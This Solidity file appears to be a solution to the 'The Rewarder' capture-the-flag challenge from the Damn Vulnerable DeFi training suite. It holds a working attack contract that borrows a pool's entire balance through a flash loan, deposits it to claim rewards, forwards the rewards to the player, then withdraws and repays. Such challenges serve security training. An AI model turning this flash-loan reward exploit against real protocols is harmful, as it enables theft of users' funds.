// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { FlashLoanerPool } from "./FlashLoanerPool.sol";


contract AttackTheRewarder {
    FlashLoanerPool public flashloaner;
    DamnValuableToken public ltoken;
    TheRewarderPool public rewarder;
    AccountingToken public atoken;
    RewardToken public rtoken;
    address public player;

    event LoanReceived(uint256 amount);

    constructor (address _flashloaner, address _rewarder, address _atoken, address _rtoken, address _ltoken, address _player) {
        flashloaner = FlashLoanerPool(_flashloaner);
        rewarder = TheRewarderPool(_rewarder);
        atoken = AccountingToken(_atoken);
        rtoken = RewardToken(_rtoken);
        ltoken = DamnValuableToken(_ltoken);
        player = _player;

    }

    function run() external {
        flashloaner.flashLoan(ltoken.balanceOf(address(flashloaner)));
    }

    function receiveFlashLoan(uint256 amount) external {
        // debugging
        // this does not show up, I have no idea if its because
        // the logging doesn't work or because the function did not get
        // called. If there are issues later, it might be worth re-looking
        // at the logging call
        emit LoanReceived(amount);

        // The amount of liquidityToken we need to send back to the loner
        uint256 SendBackBalance = ltoken.balanceOf(address(this));

        ltoken.approve(address(rewarder), SendBackBalance);

        rewarder.deposit(SendBackBalance);

        rtoken.transfer(address(player), rtoken.balanceOf(address(this)));
        rewarder.withdraw(SendBackBalance);

        ltoken.transfer(address(flashloaner), SendBackBalance);
    }
}
